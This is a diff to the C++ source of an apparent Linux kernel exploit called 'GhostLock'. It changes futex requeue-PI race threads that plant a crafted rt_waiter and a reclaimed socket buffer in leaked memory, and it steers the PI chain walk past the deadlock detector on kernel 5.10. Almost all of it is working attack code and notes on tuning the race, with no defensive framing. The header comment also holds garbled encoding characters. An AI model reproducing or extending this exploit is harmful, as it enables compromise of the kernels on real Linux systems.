@@ -1,5 +1,5 @@
 /*
- * GhostLock 鈥?PI race worker threads and the per-write route entry.
+ * GhostLock 閳?PI race worker threads and the per-write route entry.
  *
  * Split out of main.cpp; the statement order and log text are unchanged.
  */
@@ -93,8 +93,48 @@ namespace ghostlock::race {
             }
         }
         race->waiter_waiting.store(1);
-        support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-                          &race->target_futex, 0);
+        errno = 0;
+        /* Multicast delivery note (5.10, measured): rt_mutex_init_waiter
+         * rewrites tree_entry, pi_tree_entry and task, and
+         * task_blocks_on_rt_mutex rewrites task/lock/prio/deadline — so any
+         * stamp planted BEFORE the WAIT is erased before the PI walk can
+         * read it. The only surviving crafted writer is the route's own
+         * reclaim-skb plant into the leaked page (util.cpp prepare_skb_
+         * payload), which lands regardless of which thread runs; the
+         * setsockopt stamp copy on THIS thread lands after the WAIT has
+         * returned (rt_waiter dead) and can only feed the NEXT attempt's
+         * frame reuse. Keep the single-phase shape: WAIT → wake/timeout →
+         * execute. Variant B keeps the CMP's requeue engaged (CMP ret=1,
+         * WAIT=ETIMEDOUT) for the whole route window. */
+        long wrq = 0;
+        if (race->fast_repair.load()) {
+            timeout.tv_nsec += 20000000L;
+            if (timeout.tv_nsec >= 1000000000L) {
+                timeout.tv_sec++;
+                timeout.tv_nsec -= 1000000000L;
+            }
+            wrq = support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0,
+                                    &timeout, &race->target_futex, 0);
+            pr_info("[route] WAIT_REQUEUE_PI ret=%ld errno=%d\n", wrq, errno);
+            route::RouteController controller;
+            controller.init(race, &session::g_exploit_session.profile);
+            race->route_status = controller.execute(request);
+            if (controller.fallback_used) {
+                pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
+            }
+            race->route_done.store(1);
+            support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+            while (!race->owner_chain_done.load())
+                usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
+            return nullptr;
+        }
+        wrq = support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0,
+                                &timeout, &race->target_futex, 0);
+        /* The requeue lifecycle discriminator: ETIMEDOUT with no prior wake means
+         * the CMP_REQUEUE_PI never requeued this q (its trylock aborted early), so
+         * pi_blocked_on stayed NULL for the whole window and no PI walk can reach
+         * the crafted waiter. ret==0/1 means the requeue path engaged. */
+        pr_info("[route] WAIT_REQUEUE_PI ret=%ld errno=%d\n", wrq, errno);
         route::RouteController controller;
         controller.init(race, &session::g_exploit_session.profile);
         race->route_status = controller.execute(request);
@@ -128,6 +168,13 @@ namespace ghostlock::race {
         long lock_target = support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
         if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
+        /* The CMP_REQUEUE_PI trylock returns EDEADLK iff uval(target) TID equals
+         * the WAITER's TID. Log who actually owns the word after LOCK_PI so the
+         * EDEADLK condition can be checked from the log alone. */
+        const int32_t owner_tid = static_cast<int32_t>(syscall(SYS_gettid));
+        pr_info("[route] owner tid=%d locked target uval=0x%x (waiter tid=%d)\n",
+                owner_tid, race->target_futex,
+                race->waiter_tid.load(std::memory_order_relaxed));
         while (!race->waiter_ready.load() &&
                !race->owner_stop.load())
             usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
@@ -137,11 +184,21 @@ namespace ghostlock::race {
             return nullptr;
         }
         race->owner_started.store(1);
+        /* Variant B (multicast 5.10): owner HOLDS the target (so the CMP trylock
+         * attaches to its pi_state instead of the TID-0 takeover) but does NOT
+         * block on the chain futex yet. With owner->pi_blocked_on == NULL the
+         * enqueue-side chain walk is skipped (task_blocks_on_rt_mutex returns 0
+         * before adjust_prio_chain), so the deliberate waiter→target→owner→chain
+         * cycle never reaches the rt_mutex deadlock detector: the requeue loop
+         * links the crafted stack rt_waiter into the target's rt_mutex tree and
+         * the waiter's pi_blocked_on points at it — a live PI entity for the
+         * consumer's sched_setattr walk. Owner takes the chain edge only after
+         * route_done, preserving the waiter-side disarm ordering. */
+        while (!race->route_done.load() && !race->owner_stop.load())
+            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
         support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
         race->owner_chain_done.store(1);
         while (!race->owner_stop.load()) sleep(1);
-        if (lock_target == 0)
-            support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
         return nullptr;
     }
 
@@ -290,6 +347,9 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
                ? 5000
                : session::g_exploit_session.profile.race_setup_settle_us());
     errno = 0;
+    pr_info("[route] firing CMP: waiter_tid=%d target uval=0x%x\n",
+            waiter_tid.load(std::memory_order_relaxed),
+            target_futex);
     long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                 reinterpret_cast<void *>(1),
                                 &target_futex, 0);
